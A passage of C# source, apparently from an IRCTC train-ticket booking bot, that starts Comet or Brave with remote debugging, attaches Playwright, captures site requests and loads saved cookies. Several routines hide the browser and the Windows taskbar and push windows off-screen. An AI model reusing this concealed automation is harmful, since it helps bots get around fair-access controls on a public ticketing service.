                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldCometByProfile(userDataDir00);
                }
                else
                {
                    userDataDir00 = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }

                    Console.WriteLine("Comet will use profile path: " + userDataDir00);
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string cometPath = GetCometPath();
                if (string.IsNullOrEmpty(cometPath))
                {
                    MessageBox.Show("Install Comet Browser First For Booking with Comet Browser");
                    BrowserLoded = false;
                    return null;
                }
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --app=https://www.irctc.co.in/nget/assets/images/logo.png";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + cometPath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = cometPath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Edge port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Edge Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort)).GetAwaiter().GetResult().Contexts[0];
                if (browserContext.Pages.Count <= 0)
                {
                    page = browserContext.NewPageAsync().GetAwaiter().GetResult();
                }
                else
                {
                    page = browserContext.Pages[0];
                }
                IntPtr intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequests(page);
                if (directlogin != "True")
                {
                    LoadCookiesFromJsonToBrowserComet(browserContext);
                }
                IPage page2 = page;
                string url = "https://www.irctc.co.in/eticket/train-search";
                page2.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                BrowserLoded = true;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
            }
            break;
        }
        return page;
    }
    private void PrepareBraveProfile(string userDataDir)
    {
        try
        {
            string defaultProfile = Path.Combine(userDataDir, "Default");
            Directory.CreateDirectory(defaultProfile);

            string preferencesPath =
                Path.Combine(defaultProfile, "Preferences");

            Dictionary<string, object> preferences =
                new Dictionary<string, object>();

            preferences["credentials_enable_service"] = false;
            preferences["offer_to_save_passwords"] = false;

            Dictionary<string, object> profile =
                new Dictionary<string, object>();

            profile["password_manager_enabled"] = false;

            Dictionary<string, object> contentSettings =
                new Dictionary<string, object>();

            contentSettings["notifications"] = 2;
            contentSettings["geolocation"] = 2;
            contentSettings["media_stream_mic"] = 2;
            contentSettings["media_stream_camera"] = 2;

            profile["default_content_setting_values"] = contentSettings;
            preferences["profile"] = profile;

            Dictionary<string, object> autofill =
                new Dictionary<string, object>();

            autofill["profile_enabled"] = false;
            autofill["credit_card_enabled"] = false;
            autofill["address_enabled"] = false;

            preferences["autofill"] = autofill;

            string json = JsonConvert.SerializeObject(
                preferences,
                Formatting.Indented);

            File.WriteAllText(
                preferencesPath,
                json,
                Encoding.UTF8);
        }
        catch (Exception ex)
        {
            Console.WriteLine(
                "PrepareBraveProfile Error: " + ex.ToString());
        }
    }

    private bool WaitForBravePort(int port, int timeoutMilliseconds)
    {
        int elapsed = 0;

        while (elapsed < timeoutMilliseconds)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    IAsyncResult result = client.BeginConnect(
                        "127.0.0.1",
                        port,
                        null,
                        null);

                    bool connected =
                        result.AsyncWaitHandle.WaitOne(500);

                    if (connected && client.Connected)
                    {
                        client.EndConnect(result);
                        return true;
                    }
                }
            }
            catch
            {
            }

            Thread.Sleep(250);
            elapsed += 750;
        }

        return false;
    }
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool IsWindowVisible(
    IntPtr hWnd
);
    internal IPage StartBraveAndConnect_new_1(ref string userDataDir00,Rectangle rect,ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            IntPtr windowsTaskbar = IntPtr.Zero;

            try
            {
                // =====================================================
                // FREE DEBUGGING PORT
                // =====================================================

                int freeTcpPort =
                    GetFreeTcpPort();


                // =====================================================
                // BRAVE PROFILE
                // =====================================================

                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldBraveByProfile(
                        userDataDir00);
                }
                else
                {
                    userDataDir00 =
                        Path.Combine(
                            Path.GetTempPath(),
                            "brave_" +
                            Guid.NewGuid().ToString("N"));

                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(
                            userDataDir00);
                    }
                }


                Thread.Sleep(1000);


                // Existing blank HTML logic
                Convert.ToBase64String(
                    Encoding.UTF8.GetBytes(
                        blankHtml));


                // =====================================================
                // GET BRAVE PATH
                // =====================================================

                string bravePath =
                    GetBravePath();


                if (string.IsNullOrWhiteSpace(bravePath))
                {
                    throw new Exception(
                        "Brave Browser path not found.");
                }


                if (!File.Exists(bravePath))
                {
                    throw new FileNotFoundException(
                        "Brave Browser executable not found.",
                        bravePath);
                }


                // =====================================================
                // DISABLE PASSWORD MANAGER
                // =====================================================

                DisableBravePasswordManager(
                    userDataDir00);


                // =====================================================
                // RANDOM WINDOW OFFSET
                // =====================================================

                int randomOffset =
                    random.Next(
                        900,
                        1550);


                // =====================================================
                // BRAVE COMMAND LINE
                // =====================================================

                string text3 =
                    string.Format(
                        "--remote-debugging-port={0} ",
                        freeTcpPort);


                string text4 =
                    "--remote-debugging-address=127.0.0.1 " +
                    "--user-data-dir=\"";


                string text5 =
                    userDataDir00;


                string text6 =
                    "\" " +
                    "--no-first-run " +
                    "--no-default-browser-check " +
                    "--disable-session-crashed-bubble " +
                    "--disable-save-password-bubble " +
                    "--disable-infobars " +
                    "--disable-sync " +
                    "--disable-features=BraveRewards,BraveWallet " +
                    "https://www.irctc.co.in/nget/assets/images/logo.png";


                string windowPosition =
                    " --window-position=" +
                    rect.X +
                    "," +
                    (rect.Y + randomOffset);


                string text7 =
                    text3 +
                    text4 +
                    text5 +
                    text6 +
                    windowPosition;


                // =====================================================
                // WINDOWS TASKBAR HIDE
                // =====================================================

                windowsTaskbar =
                    FindWindow(
                        "Shell_TrayWnd",
                        null);


                if (windowsTaskbar != IntPtr.Zero)
                {
                    ShowWindow(
                        windowsTaskbar,
                        SW_HIDE);
                }


                // =====================================================
                // LAUNCH BRAVE
                // =====================================================

                if (num == 0)
                {
                    string arguments =
                        "/c start \"\" \"" +
                        bravePath +
                        "\" " +
                        text7;


                    ProcessStartInfo processStartInfo =
                        new ProcessStartInfo();


                    processStartInfo.FileName =
                        "cmd.exe";


                    processStartInfo.Arguments =
                        arguments;


                    processStartInfo.CreateNoWindow =
                        true;


                    processStartInfo.UseShellExecute =
                        false;


                    process =
                        Process.Start(
                            processStartInfo);
                }
                else
                {
                    process =
                        Process.Start(
                            new ProcessStartInfo
                            {
                                FileName =
                                    bravePath,

                                Arguments =
                                    text7,

                                UseShellExecute =
                                    false,

                                WindowStyle =
                                    ProcessWindowStyle.Normal
                            });
                }


                // =====================================================
                // WAIT INITIAL BRAVE START
                // =====================================================

                Thread.Sleep(3000);


                // =====================================================
                // WAIT FOR DEBUGGING PORT
                // =====================================================

                bool flag = false;

                int num2 = 0;


                Console.WriteLine(
                    "[Info] Waiting for Brave debugging port...");


                while (!flag && num2 < 15)
                {
                    try
                    {
                        using (TcpClient tcpClient =
                            new TcpClient())
                        {
                            tcpClient.Connect(
                                "127.0.0.1",
                                freeTcpPort);


                            flag = true;
                        }
                    }
                    catch
                    {
                        Thread.Sleep(500);

                        num2++;
                    }
                }


                if (!flag)
                {
                    throw new Exception(
                        "Brave remote debugging port did not open.");
                }


                Console.WriteLine(
                    "[Info] Brave debugging port opened.");


                // =====================================================
                // PLAYWRIGHT CDP CONNECTION
                // =====================================================

                IBrowserType chromium =
                    Playwright
                        .CreateAsync()
                        .GetAwaiter()
                        .GetResult()
                        .Chromium;


                string cdpUrl =
                    string.Format(
                        "http://127.0.0.1:{0}",
                        freeTcpPort);


                IBrowser browser =
                    chromium
                        .ConnectOverCDPAsync(
                            cdpUrl)
                        .GetAwaiter()
                        .GetResult();


                if (
                    browser.Contexts == null ||
                    browser.Contexts.Count == 0
                )
                {
                    throw new Exception(
                        "Brave browser context not found.");
                }


                IBrowserContext browserContext =
                    browser.Contexts[0];


                // =====================================================
                // GET EXISTING PAGE OR CREATE NEW PAGE
                // =====================================================

                if (browserContext.Pages.Count <= 0)
                {
                    page =
                        browserContext
                            .NewPageAsync()
                            .GetAwaiter()
                            .GetResult();
                }
                else
                {
                    page =
                        browserContext.Pages[0];
                }


                // =====================================================
                // GET BRAVE WINDOW USING CDP
                // =====================================================

                IntPtr braveHwnd =
                    IntPtr.Zero;


                try
                {
                    Console.WriteLine(
                        "[Info] Finding Brave window...");


                    // ---------------------------------------------
                    // IMPORTANT:
                    // Old FindBraveWindowByUserDataDir() removed.
                    //
                    // It was causing blocking/hanging.
                    // ---------------------------------------------

                    for (int h = 0; h < 30; h++)
                    {
                        Process[] braveProcesses =
                            Process.GetProcessesByName(
                                "brave");


                        foreach (Process braveProcess
                            in braveProcesses)
                        {
                            try
                            {
                                braveProcess.Refresh();


                                IntPtr hwnd =
                                    braveProcess
                                        .MainWindowHandle;


                                if (hwnd == IntPtr.Zero)
                                {
                                    continue;
                                }


                                if (!IsWindowVisible(hwnd))
                                {
                                    continue;
                                }


                                braveHwnd =
                                    hwnd;


                                break;
                            }
                            catch
                            {
                                // Ignore inaccessible
                                // Brave child processes
                            }
                        }


                        if (braveHwnd != IntPtr.Zero)
                        {
                            break;
                        }


                        Thread.Sleep(100);
                    }


                    // =================================================
                    // REMOVE BRAVE WINDOW FROM TASKBAR
                    // =================================================

                    if (braveHwnd != IntPtr.Zero)
                    {
                        Console.WriteLine(
                            "[Info] Brave HWND found: " +
                            braveHwnd);


                        try
                        {
                            EdgeTaskbarHider
                                .HideFromTaskbar(
                                    braveHwnd);


                            Console.WriteLine(
                                "[Info] Brave hidden from taskbar.");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(
                                "[Warning] HideFromTaskbar: " +
                                ex.ToString());
                        }
                    }
                    else
                    {
                        // Do NOT stop browser loading
                        // if HWND cannot be found.

                        Console.WriteLine(
                            "[Warning] Brave HWND not found. " +
                            "Continuing without taskbar hiding.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(
                        "[Warning] Brave HWND detection: " +
                        ex.ToString());
                }
                finally
                {
                    // =================================================
                    // ALWAYS RESTORE WINDOWS TASKBAR
                    // =================================================

                    try
                    {
                        if (windowsTaskbar != IntPtr.Zero)
                        {
                            ShowWindow(
                                windowsTaskbar,
                                SW_SHOW);
                        }
                    }
                    catch
                    {
                    }


                    windowsTaskbar =
                        IntPtr.Zero;
                }


                // =====================================================
                // SET BRAVE WINDOW POSITION USING CDP
                // =====================================================

                try
                {
                    ICDPSession cdpSession =
                        page.Context
                            .NewCDPSessionAsync(
                                page)
                            .GetAwaiter()
                            .GetResult();


                    JsonElement? result =
                        cdpSession
                            .SendAsync(
                                "Browser.getWindowForTarget")
                            .GetAwaiter()
                            .GetResult();


                    if (result.HasValue)
                    {
                        JsonElement value =
                            result.Value;


                        int windowId =
                            value
                                .GetProperty(
                                    "windowId")
                                .GetInt32();


                        Dictionary<string, object>
                            dictionary =
                                new Dictionary<string, object>();


                        dictionary.Add(
                            "windowId",
                            windowId);


                        Dictionary<string, object>
                            bounds =
                                new Dictionary<string, object>();


                        bounds.Add(
                            "left",
                            rect.X);


                        bounds.Add(
                            "top",
                            rect.Y +
                            randomOffset);


                        bounds.Add(
                            "width",
                            rect.Width);


                        bounds.Add(
                            "height",
                            rect.Height);


                        bounds.Add(
                            "windowState",
                            "normal");


                        dictionary.Add(
                            "bounds",
                            bounds);


                        cdpSession
                            .SendAsync(
                                "Browser.setWindowBounds",
                                dictionary)
                            .GetAwaiter()
                            .GetResult();


                        Console.WriteLine(
                            "[Info] Brave window position set.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(
                        "[Warning] Window position: " +
                        ex.ToString());
                }


                // =====================================================
                // REQUEST CAPTURE
                // =====================================================

                CaptureIRCTCRequests(
                    page);


                // =====================================================
                // IRCTC NAVIGATION
                // =====================================================

                IPage page2 =
                    page;


                string url =
                    "https://www.irctc.co.in/nget/train-search";


                var response =
                    page2
                        .GotoAsync(
                            url,
                            new PageGotoOptions
                            {
                                WaitUntil =
                                    WaitUntilState.DOMContentLoaded,

                                Timeout =
                                    60000
                            })
                        .GetAwaiter()
                        .GetResult();


                // =====================================================
                // WAIT AFTER NAVIGATION
                // =====================================================

                Thread.Sleep(5000);


                // =====================================================
                // RESPONSE INFORMATION
                // =====================================================

                if (response != null)
                {
                    string finalUrl =
                        response.Url;


                    int statusCode =
                        response.Status;


                    Console.WriteLine(
                        "URL : " +
                        finalUrl);


                    Console.WriteLine(
                        "Status : " +
                        statusCode);
                }


                // =====================================================
                // FULL HTML READ
                // =====================================================

                string html =
                    page2
                        .ContentAsync()
                        .GetAwaiter()
                        .GetResult();


                // =====================================================
                // VERIFY IRCTC PAGE
                // =====================================================

                if (
                    !html.Contains(
                        "Book train tickets online instantly on IRCTC")
                )
                {
                    Console.WriteLine(
                        "[Warning] IRCTC page verification failed.");


                    // =================================================
                    // RESTORE TASKBAR BEFORE RETRY
                    // =================================================

                    try
                    {
                        IntPtr taskbar =
                            FindWindow(
                                "Shell_TrayWnd",
                                null);


                        if (taskbar != IntPtr.Zero)
                        {
                            ShowWindow(
                                taskbar,
                                SW_SHOW);
                        }
                    }
                    catch
                    {
                    }


                    if (num == 0)
                    {
                        num++;

                        continue;
                    }


                    BrowserLoded = false;

                    break;
                }


                // =====================================================
                // SUCCESS
                // =====================================================

                BrowserLoded =
                    true;


                Console.WriteLine(
                    "[Info] Brave + IRCTC loaded successfully.");
            }
            catch (Exception ex)
            {
                // =====================================================
                // ALWAYS RESTORE WINDOWS TASKBAR
                // =====================================================

                try
                {
                    if (windowsTaskbar != IntPtr.Zero)
                    {
                        ShowWindow(
                            windowsTaskbar,
                            SW_SHOW);


                        windowsTaskbar =
                            IntPtr.Zero;
                    }
                    else
                    {
                        IntPtr taskbar =
                            FindWindow(
                                "Shell_TrayWnd",
                                null);


                        if (taskbar != IntPtr.Zero)
                        {
                            ShowWindow(
                                taskbar,
                                SW_SHOW);
                        }
                    }
                }
                catch
                {
                }


                // =====================================================
                // KILL FAILED PROCESS
                // =====================================================

                if (
                    process != null &&
                    !process.HasExited
                )
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }


                Console.WriteLine(
                    "[Brave Error] " +
                    ex.ToString());


                // =====================================================
                // ONE RETRY
                // =====================================================

                if (num == 0)
                {
                    num++;

                    continue;
                }


                BrowserLoded =
                    false;
            }


            break;
        }


        // =========================================================
        // FINAL WINDOWS TASKBAR RESTORE
        // =========================================================

        try
        {
            IntPtr taskbar =
                FindWindow(
                    "Shell_TrayWnd",
                    null);


            if (taskbar != IntPtr.Zero)
            {
                ShowWindow(
                    taskbar,
                    SW_SHOW);
            }
        }
        catch
        {
        }


        return page;
    }
    internal IPage StartBraveAndConnect_new_1mmmmmmmm(
        ref string userDataDir00,
        Rectangle rect,
        ref IPage page)
    {
        Process process = null;
        int attempt = 0;

        try
        {
            KillBraveProcesses();

            while (attempt < 2)
            {
                int freeTcpPort = GetFreeTcpPort();
                IntPtr windowsTaskbar = IntPtr.Zero;

                try
                {
                    if (!string.IsNullOrWhiteSpace(userDataDir00))
                    {
                        KillOldBraveByProfile(userDataDir00);
                    }
                    else
                    {
                        userDataDir00 = Path.Combine(
                            Path.GetTempPath(),
                            "BraveProfiles",
                            "Profile_" + Guid.NewGuid().ToString("N"));
                    }

                    Directory.CreateDirectory(userDataDir00);

                    PrepareBraveProfile(userDataDir00);

                    string bravePath = GetBravePath();

                    if (string.IsNullOrWhiteSpace(bravePath) ||
                        !File.Exists(bravePath))
                    {
                        MessageBox.Show(
                            "Brave Browser nahi mila!",
                            "Brave",
                            MessageBoxButtons.OK,
                            MessageBoxIcon.Warning);

                        BrowserLoded = false;
                        return null;
                    }

                    StringBuilder args = new StringBuilder();

                    args.Append("--remote-debugging-port=")
                        .Append(freeTcpPort)
                        .Append(' ');

                    args.Append(
                        "--remote-debugging-address=127.0.0.1 ");

                    args.Append("--user-data-dir=\"")
                        .Append(userDataDir00)
                        .Append("\" ");

                    args.Append("--profile-directory=Default ");
                    args.Append("--no-first-run ");
                    args.Append("--no-default-browser-check ");
                    args.Append("--disable-session-crashed-bubble ");
                    args.Append("--disable-notifications ");
                    args.Append("--disable-popup-blocking ");
                    args.Append("--disable-sync ");
                    args.Append("--disable-save-password-bubble ");

                    int x = rect.X;
                    int y = rect.Y;
                    int width = Math.Max(400, rect.Width);
                    int height = Math.Max(400, rect.Height);

                    args.Append(
                        $"--window-position={x},{y + 900} ");

                    args.Append(
                        $"--window-size={width},{height} ");

                    ProcessStartInfo psi =
                        new ProcessStartInfo
                        {
                            FileName = bravePath,
                            Arguments = args.ToString(),
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WindowStyle =
                                ProcessWindowStyle.Normal
                        };


                    // =================================================
                    // EXISTING BRAVE LAUNCH
                    // =================================================

                    process =
                        Process.Start(psi);

                    if (!WaitForBravePort(
                            freeTcpPort,
                            15000))
                    {
                        throw new Exception(
                            "Brave debugging port open nahi hua.");
                    }

                    IPlaywright playwright =
                        Playwright
                            .CreateAsync()
                            .GetAwaiter()
                            .GetResult();

                    IBrowser browser =
                        playwright.Chromium
                            .ConnectOverCDPAsync(
                                "http://127.0.0.1:" +
                                freeTcpPort)
                            .GetAwaiter()
                            .GetResult();

                    if (browser.Contexts.Count == 0)
                    {
                        throw new Exception(
                            "Brave browser context nahi mila.");
                    }

                    IBrowserContext browserContext =
                        browser.Contexts[0];

                    if (browserContext.Pages.Count > 0)
                    {
                        page =
                            browserContext.Pages[0];
                    }
                    else
                    {
                        page =
                            browserContext
                                .NewPageAsync()
                                .GetAwaiter()
                                .GetResult();
                    }

                    // =================================================
                    // EXISTING WINDOW POSITION CODE
                    // =================================================

                    try
                    {
                        ICDPSession cdp =
                            page.Context
                                .NewCDPSessionAsync(page)
                                .GetAwaiter()
                                .GetResult();

                        JsonElement? windowResult =
                            cdp.SendAsync(
                                    "Browser.getWindowForTarget")
                                .GetAwaiter()
                                .GetResult();

                        if (windowResult.HasValue)
                        {
                            int windowId =
                                windowResult.Value
                                    .GetProperty("windowId")
                                    .GetInt32();

                            Dictionary<string, object> bounds =
                                new Dictionary<string, object>
                                {
                                { "left", rect.X },
                                { "top", rect.Y + 900 },
                                {
                                    "width",
                                    Math.Max(400, rect.Width)
                                },
                                {
                                    "height",
                                    Math.Max(400, rect.Height)
                                },
                                {
                                    "windowState",
                                    "normal"
                                }
                                };

                            Dictionary<string, object> parameters =
                                new Dictionary<string, object>
                                {
                                {
                                    "windowId",
                                    windowId
                                },
                                {
                                    "bounds",
                                    bounds
                                }
                                };

                            cdp.SendAsync(
                                    "Browser.setWindowBounds",
                                    parameters)
                                .GetAwaiter()
                                .GetResult();
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(
                            "Brave window resize error: " +
                            ex.ToString());
                    }

                    // =================================================
                    // BRAVE TASKBAR
                    // =================================================

                    IntPtr hwnd = IntPtr.Zero;

                    try
                    {
                        // Brave HWND milne tak wait.
                        for (int h = 0; h < 50; h++)
                        {
                            hwnd =
                                EdgeTaskbarHider
                                    .FindBraveWindowByUserDataDir(
                                        userDataDir00);

                            if (hwnd != IntPtr.Zero)
                            {

                                break;
                            }

                            Thread.Sleep(100);
                        }
                    }
                    finally
                    {
                    }

                    // =================================================
                    // EXISTING APP FUNCTIONS
                    // =================================================

                    CaptureIRCTCRequestsbrave(page);

                    page.GotoAsync(
                            "https://www.irctc.co.in/nget/train-search",
                            new PageGotoOptions
                            {
                                WaitUntil =
                                    WaitUntilState.DOMContentLoaded,

                                Timeout =
                                    60000
                            })
                        .GetAwaiter()
                        .GetResult();

                    BrowserLoded = true;

                    return page;
                }
                catch (Exception ex)
                {

                    Console.WriteLine(
                        "Brave start attempt " +
                        (attempt + 1) +
                        " failed: " +
                        ex.ToString());

                    try
                    {
                        if (process != null &&
                            !process.HasExited)
                        {
                            process.Kill();
                        }
                    }
                    catch
                    {
                    }

                    attempt++;

                    if (attempt >= 2)
                    {
                        BrowserLoded = false;

                        MessageBox.Show(
                            "Brave Browser start nahi ho saka.\r\n\r\n" +
                            ex.Message,
                            "Brave Error",
                            MessageBoxButtons.OK,
                            MessageBoxIcon.Error);

                        return null;
                    }

                    Thread.Sleep(1000);
                }
            }
        }
        catch (Exception ex)
        {
            // Final error safety
            try
            {
                IntPtr taskbar =
                    FindWindow(
                        "Shell_TrayWnd",
                        null);

                if (taskbar != IntPtr.Zero)
                {
                    ShowWindow(
                        taskbar,
                        SW_SHOW);
                }
            }
            catch
            {
            }

            BrowserLoded = false;

            MessageBox.Show(
                ex.Message,
                "Brave Error",
                MessageBoxButtons.OK,
                MessageBoxIcon.Error);
        }

        // Final taskbar safety
        try
        {
            IntPtr taskbar =
                FindWindow(
                    "Shell_TrayWnd",
                    null);

            if (taskbar != IntPtr.Zero)
            {
                ShowWindow(
                    taskbar,
                    SW_SHOW);
            }
        }
        catch
        {
        }

        return null;
    }
    internal IPage StartBraveAndConnect_new_2(ref string userDataDir00, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        KillBraveProcesses();
        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldBraveByProfile(userDataDir00);
                }
                else
                {
                    string tempPath = Path.GetTempPath();
                    string path = "BraveProfiles";
                    string path2 = Path.Combine(tempPath, path);
                    string text = "Profile_";
                    Guid guid = Guid.NewGuid();
                    string text2 = "N";
                    userDataDir00 = Path.Combine(path2, text + guid.ToString(text2));
                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string edgePath = GetBravePath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --https://www.irctc.co.in/nget/assets/images/logo.png";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + edgePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = edgePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Brave port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Brave Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort)).GetAwaiter().GetResult().Contexts[0];
                if (browserContext.Pages.Count <= 0)
                {
                    page = browserContext.NewPageAsync().GetAwaiter().GetResult();
                }
                else
                {
                    page = browserContext.Pages[0];
                }
                IntPtr intPtr = EdgeTaskbarHider.FindBraveWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x );
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequestsbrave(page);
                IPage page2 = page;
                string url = "https://www.irctc.co.in/nget/train-search";
                page2.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                BrowserLoded = true;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
            }
            break;
        }
        return page;
    }

    internal IPage StartBraveAndConnect_2(ref string userDataDir, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        Process process = null;
        KillBraveProcesses();
        try
        {
            int port = GetFreeTcpPort();
            if (string.IsNullOrEmpty(userDataDir))
            {
                userDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware\\Brave-Browser\\User Data");
            }
            else
            {
                KillOldBraveByProfile(userDataDir);
            }

            string bravePath = GetBravePath();
            if (string.IsNullOrEmpty(bravePath))
